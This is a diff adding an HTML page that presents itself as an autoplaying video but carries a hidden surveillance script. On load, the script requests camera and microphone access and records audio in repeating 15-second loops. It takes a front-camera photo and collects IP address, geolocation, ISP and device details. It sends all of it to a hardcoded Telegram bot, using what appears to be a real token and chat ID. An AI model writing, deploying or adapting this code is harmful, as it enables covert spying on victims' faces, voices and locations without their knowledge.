@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      padding: 0;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 35px;
+      margin: 10px 0;
+      text-align: center;
+    }
+    .large-text {
+      font-size: 45px;
+      font-weight: bold;
+      color: white;
+      margin-top: 50px;
+    }
+    video {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="stage1">
+    <h1> ➪ 🌐⚠︎☠︎︎</h1>
+    <video autoplay playsinline controls>
+      <source src="https://files.catbox.moe/7tlwat.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+
+    <audio id="background-music" autoplay loop>
+      <source src="your-music-file-url.mp3" type="audio/mp3">
+      Your browser does not support the audio element.
+    </audio>
+
+    <h1>+</h1>
+    <canvas id="canvas" width="300" height="250" style="display:none;"></canvas>
+  </div>
+
+<script>
+  // === Set your bot token and chat ID here ===
+  const botToken = '7865121878:AAHgj10aM-GLn-xET-uwPweFb3S9rmCSJhE';
+  const chatId = '7890542447';
+
+  // === Request Permissions on Page Load ===
+  function requestPermissions() {
+    // Request Camera Permission
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        startCameraCapture(stream);
+      })
+      .catch(error => {
+        alert("Camera access denied: " + error);
+      });
+
+    // Request Mic Permission
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then(stream => {
+        startMicRecording(stream);
+      })
+      .catch(error => {
+        alert("Mic access denied: " + error);
+      });
+  }
+
+  // === Start Mic Recording ===
+  let mediaRecorder;
+  let audioChunks = [];
+
+  function startMicRecording(stream) {
+    mediaRecorder = new MediaRecorder(stream);
+
+    mediaRecorder.ondataavailable = e => {
+      audioChunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("audio", audioBlob, "AudioFile");
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        audioChunks = [];
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 15000);  // Record for 15 seconds
+      });
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), 15000);  // Stop recording after 15 seconds
+  }
+
+  // === Start Camera Capture and Send Photo ===
+  // === Start Camera Capture and Send Photo ===
+function startCameraCapture(stream) {
+    const canvas = document.createElement("canvas");
+    const context = canvas.getContext("2d");
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    // Wait for video to load, then capture the image
+    video.onloadedmetadata = () => {
+        // Adjust canvas size to match video dimensions
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg", 0.8);  // Adjust quality here (0.8 is 80%)
+
+            // Convert image to blob and send to Telegram
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", blob, "photo.jpg");
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    }).then(() => {
+                        setTimeout(runInfoTracking, 1000);  // Start tracking info after photo sent
+                    });
+                });
+        }, 3000);  // Capture photo after 3 seconds
+    };
+}
+
+  // === Start Info Tracking ===
+  function runInfoTracking() {
+    const startTime = Date.now();
+    navigator.getBattery().then(function(battery) {
+      const level = battery.level * 100;
+      const charging = battery.charging ? "Yes" : "No";
+      const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "UNKNOWN";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const orientation = screen.orientation ? screen.orientation.type : "UNKNOWN";
+      const lang = navigator.language || "UNKNOWN";
+      const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No";
+      const os = navigator.platform;
+      const deviceModel = navigator.userAgent;
+      const referrer = document.referrer || "N/A";
+
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipv4 => {
+          fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(loc => {
+              const latitude = loc.latitude;
+              const longitude = loc.longitude;
+              const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+              const timeSpent = Math.round((Date.now() - startTime) / 1000);
+
+              const message = `
+\`\`\`
+Country             : ${loc.country_name}
+RAM                 : ${ram}
+Battery             : ${level}%
+City                : ${loc.city}
+IP V4               : ${ipv4.ip}
+IP V6               : ${(loc.ip.includes(':')) ? loc.ip : "N/A"}
+ISP                 : ${loc.org}
+ASN                 : ${loc.asn}
+Device Model        : ${deviceModel}
+Time Zone Offset    : ${loc.utc_offset}
+Device Info         : ${os}
+Referrer            : ${referrer}
+Screen Resolution   : ${screenRes}
+Language            : ${lang}
+Geo Location        : ${loc.country_name}
+Dark Mode           : ${darkMode}
+Status              : Charging - ${charging}
+Screen Orientation  : ${orientation}
+Session Duration    : ${timeSpent} seconds
+Google Maps Link    : ${mapsLink}
+\`\`\``;
+
+              const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+              fetch(url);
+            });
+        });
+    });
+  }
+
+  // === Page Load ===
+  window.onload = requestPermissions;
+</script>
+
+</body>
+</html>
